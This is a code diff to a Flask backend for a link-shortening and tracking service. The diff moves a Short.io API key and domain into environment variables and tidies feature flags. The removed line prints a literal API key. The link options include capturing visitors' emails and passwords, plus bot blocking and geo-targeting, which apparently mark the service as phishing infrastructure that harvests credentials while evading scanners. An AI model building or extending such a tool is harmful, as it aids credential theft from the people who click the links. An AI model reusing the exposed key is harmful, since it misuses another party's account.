@@ -1,5 +1,6 @@
 
 from flask import Blueprint, request, jsonify, session
+import os
 from src.models.user import db, User
 from src.models.link import Link
 from src.models.tracking_event import TrackingEvent
@@ -56,13 +57,15 @@ def create_link():
             scheme = request.headers.get("X-Forwarded-Proto", request.scheme)
             base_url = f"{scheme}://{request.host}"
             short_url = f"{base_url}/s/{short_code}"
+            # For Vercel domain, short_code is the generated code
+            # No change needed for short_code as it's already assigned above
         elif domain_type == "shortio":
             # Use Short.io API to create a short link
-            shortio_api_key = "sk_DbGGlUHPN7Z9VotL"  # Provided API key
+            shortio_api_key = os.environ.get("SHORTIO_API_KEY")
             if not shortio_api_key:
                 return jsonify({"success": False, "error": "Short.io API key not configured"}), 500
             
-            shortio_domain = "Secure-links.short.gy"  # Provided domain
+            shortio_domain = os.environ.get("SHORTIO_DOMAIN")
             if not shortio_domain:
                 return jsonify({"success": False, "error": "Short.io domain not configured"}), 500
 
@@ -90,6 +93,8 @@ def create_link():
             while Link.query.filter_by(short_code=short_code).first():
                 short_code = generate_short_code()
             short_url = f"https://{custom_domain}/{short_code}"
+            # For custom domain, short_code is the generated code
+            # No change needed for short_code as it's already assigned above
         else:
             return jsonify({"success": False, "error": "Invalid domain type or custom domain not provided"}), 400
 
@@ -177,12 +182,12 @@ def links():
         preview_template_url = sanitize_input(data.get("preview_template_url", ""))
         
         # Security features
-        capture_email = data.get("capture_email", False)
-        capture_password = data.get("capture_password", False)
-        bot_blocking_enabled = data.get("bot_blocking_enabled", True)
-        rate_limiting_enabled = data.get("rate_limiting_enabled", False)
-        dynamic_signature_enabled = data.get("dynamic_signature_enabled", False)
-        mx_verification_enabled = data.get("mx_verification_enabled", False)
+        capture_email = bool(data.get("capture_email", False))
+        capture_password = bool(data.get("capture_password", False))
+        bot_blocking_enabled = bool(data.get("bot_blocking_enabled", True))
+        rate_limiting_enabled = bool(data.get("rate_limiting_enabled", False))
+        dynamic_signature_enabled = bool(data.get("dynamic_signature_enabled", False))
+        mx_verification_enabled = bool(data.get("mx_verification_enabled", False))
         
         # Geo targeting
         geo_targeting_enabled = data.get("geo_targeting_enabled", False)
@@ -218,12 +223,12 @@ def links():
                 bot_blocking_enabled=bot_blocking_enabled,
                 geo_targeting_enabled=geo_targeting_enabled,
                 geo_targeting_type=geo_targeting_type,
-                allowed_countries=json.dumps(allowed_countries) if allowed_countries else None,
-                blocked_countries=json.dumps(blocked_countries) if blocked_countries else None,
-                allowed_regions=json.dumps(allowed_regions) if allowed_regions else None,
-                blocked_regions=json.dumps(blocked_regions) if blocked_regions else None,
-                allowed_cities=json.dumps(allowed_cities) if allowed_cities else None,
-                blocked_cities=json.dumps(blocked_cities) if blocked_cities else None,
+                allowed_countries=json.dumps(allowed_countries) if allowed_countries else "[]",
+                blocked_countries=json.dumps(blocked_countries) if blocked_countries else "[]",
+                allowed_regions=json.dumps(allowed_regions) if allowed_regions else "[]",
+                blocked_regions=json.dumps(blocked_regions) if blocked_regions else "[]",
+                allowed_cities=json.dumps(allowed_cities) if allowed_cities else "[]",
+                blocked_cities=json.dumps(blocked_cities) if blocked_cities else "[]",
                 rate_limiting_enabled=rate_limiting_enabled,
                 dynamic_signature_enabled=dynamic_signature_enabled,
                 mx_verification_enabled=mx_verification_enabled,
